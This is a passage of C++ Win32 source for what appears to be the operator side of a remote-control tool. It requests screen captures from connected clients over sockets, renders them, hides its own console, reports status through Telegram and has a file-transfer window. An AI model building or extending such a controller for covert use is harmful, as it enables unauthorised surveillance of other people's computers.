        SetTimer(Chwnd, SCREEN_TIMER, FPS, NULL);
        Gdiplus::GdiplusStartupInput gdiplusStartupInput;
        ULONG_PTR gdiplusToken;
        GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
        break;
    }
    case WM_TIMER:
    {
        if (wParam == SCREEN_TIMER)
        {
            SOCKET selectedSocket = clientSockets[itemIndex];
            auto it = std::find(clientSockets.begin(), clientSockets.end(), selectedSocket);
            send(selectedSocket, "capscr", strlen("capscr"), 0);

            InvalidateRect(Chwnd, NULL, TRUE);

        }
        break;
    }

    case WM_PAINT:
    {
        int bufferLen = 0;
        const int MAX_BYTES = 100000;
        Sleep(FPS);
        do
        {
            SOCKET selectedSocket = clientSockets[itemIndex];

            ULONGLONG bufferLenNetworkOrder = 0;
            int bytesReceived = 0;
            int rerr = 0;
           
            while (bytesReceived < sizeof(bufferLenNetworkOrder)) {
                rerr = recv(selectedSocket, (char*)&bufferLenNetworkOrder + bytesReceived, sizeof(bufferLenNetworkOrder) - bytesReceived, 0);
                bytesReceived += rerr;
            }
            bufferLen = ntohll(bufferLenNetworkOrder);

            if (bufferLen > 0 && bufferLen < MAX_BYTES)
            {
                imageBuffer.reset(new char[bufferLen]);
            }

            bytesReceived = 0;

            if (bufferLen < 0 || bufferLen > MAX_BYTES)
            {
                continue;
            }

            while (bytesReceived < bufferLen && bufferLen < MAX_BYTES) {
                rerr = recv(selectedSocket, imageBuffer.get() + bytesReceived, bufferLen - bytesReceived, 0);
                if (rerr > 0 && rerr <= bufferLen - bytesReceived) {
                    bytesReceived += rerr;
                }
                else {
                    return {};
                }
            }

            HGLOBAL hGlobal = GlobalAlloc(GHND, bufferLen);
            void* pData = GlobalLock(hGlobal);
            memcpy(pData, imageBuffer.get(), bufferLen);

            GlobalUnlock(hGlobal);

            IStream* pStream = NULL;
            CreateStreamOnHGlobal(hGlobal, TRUE, &pStream);

            Gdiplus::Bitmap bitmap(pStream);
            Gdiplus::Status status = bitmap.GetLastStatus();


            PAINTSTRUCT ps;
            HDC hdc = BeginPaint(Chwnd, &ps);

            int imgWidth = bitmap.GetWidth();
            int imgHeight = bitmap.GetHeight();

            Gdiplus::Graphics graphics(hdc);

            RECT clientRect;
            GetClientRect(Chwnd, &clientRect);

            graphics.DrawImage(&bitmap, 0, 0, imgWidth, imgHeight);
            GlobalFree(hGlobal);
            pStream->Release();
            imageBuffer.reset(nullptr);

            EndPaint(Chwnd, &ps);
            break;
        } while (bufferLen < 0 || bufferLen > MAX_BYTES);
        break;
    }


    case WM_CLOSE:
    {
        KillTimer(Chwnd, SCREEN_TIMER);
        DestroyWindow(hwndClient);
        break;
    }

    case WM_DESTROY:
        KillTimer(Chwnd, SCREEN_TIMER);
        DestroyWindow(hwndClient);
        return 0;

    default:
        return DefWindowProc(Chwnd, uMsg, wParam, lParam);
    }
    return 0;
}



int APIENTRY wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
    LPWSTR lpCmdLine, int nCmdShow)
{
    ::ShowWindow(::GetConsoleWindow(), SW_HIDE);

    TelegramServerStatus(true);

    WNDCLASSEX wc;
    HWND hwnd;
    MSG Msg;

    WndRegisterClass(hInstance);
    WndClientRegisterClass(hInstance);
    WndClientFTPRegisterClass(hInstance);

    int wWidth = 1300;
    int wHeight = 780;
    hwnd = CreateWindowExW(
        WS_EX_CLIENTEDGE,
        g_szClassName,
        wn_title,
        WS_OVERLAPPEDWINDOW,
        CW_USEDEFAULT, CW_USEDEFAULT, wWidth, wHeight,
        NULL, NULL, hInstance, NULL);

    if (hwnd == NULL)
    {
        MessageBoxW(NULL, L"Window Creation Failed!", L"Error!",
            MB_ICONEXCLAMATION | MB_OK);
        return 0;
    }

    SendMessageW(hwnd, WM_SETICON, ICON_SMALL, (LPARAM)hcIcon);
    ShowWindow(hwnd, nCmdShow);
    UpdateWindow(hwnd);
    ListenOnPort(hwnd, PORT);

    while (GetMessageW(&Msg, NULL, 0, 0) > 0)
    {
        TranslateMessage(&Msg);
        DispatchMessageW(&Msg);
    }
    return Msg.wParam;
}